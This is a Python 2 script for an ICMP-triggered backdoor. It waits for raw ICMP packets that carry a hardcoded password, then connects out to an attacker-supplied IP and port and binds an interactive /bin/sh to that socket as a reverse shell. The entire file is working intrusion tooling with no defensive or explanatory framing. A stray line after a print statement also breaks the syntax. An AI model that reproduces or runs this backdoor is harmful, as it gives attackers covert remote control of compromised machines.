#!/usr/bin/env python
# encoding: utf-8

import os, sys, subprocess, socket, struct, select, string, argparse
ICMP_ECHO_REQUEST = 8
PASSWD = str("haxx0rpassword")

#processing packet to look if it contains password and instructions
#to send reverse shell
def receivePackets(my_socket):
    while True:
        try:
            recPacket, addr = my_socket.recvfrom(1024)
            icmpHeader = recPacket[20:28]
            type, code, checksum, packetID, sequence = struct.unpack(
                "bbHHh", icmpHeader)

            #unpacking the packet with desired format
            ip1, ip2, ip3, ip4, port, password = struct.unpack("HHHHi16s", recPacket[28:28 + 16 + 8 + 4])
            ip = str(ip1) + '.' + str(ip2) + '.' + str(ip3) + '.' + str(ip4)
            print ip + ':' + str(port)
i
            #check if the unpacking worked with expected format and
            #check if it contains the predefined password
            if password.rstrip('\x00') == PASSWD.strip():
                print "right pass, open reverse shell"

                #send the reverse shell to specified port
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
                s.connect((ip,port));
                os.dup2(s.fileno(),0);
                os.dup2(s.fileno(),1);
                os.dup2(s.fileno(),2);
                p=subprocess.call(["/bin/sh","-i"]);

        except KeyboardInterrupt:
            break
        except:
            pass

def startListener():
    icmp = socket.getprotobyname("icmp")
    try:
        my_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp)
    except socket.error, (errno, msg):
        if errno == 1:
            msg = msg + ( ": You have to be root.")
            raise socket.error(msg)
        raise
    receivePackets(my_socket)
    my_socket.close()

def main():
    try:
        try:
            startListener()
        except socket.gaierror, e:
            pass
    except KeyboardInterrupt:
        pass

if __name__ == '__main__':
    main()
